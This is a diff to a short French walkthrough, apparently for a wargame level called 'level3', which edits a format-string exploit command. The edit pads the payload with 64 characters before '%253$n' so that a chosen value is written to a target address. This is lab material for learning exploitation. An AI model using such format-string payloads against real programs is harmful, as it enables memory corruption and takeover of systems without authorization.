@@ -9,4 +9,4 @@ Ce script nous indique que l'argv[1] se trouve a l'offset 253.
 Il ne nous reste qu'a afficher 64 octets afin de pouvoir les mettre en memoire via le format "n".
 
 ./level3 `echo $'\x8c\x98\x04\x08'`
-%253$n
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%253$n
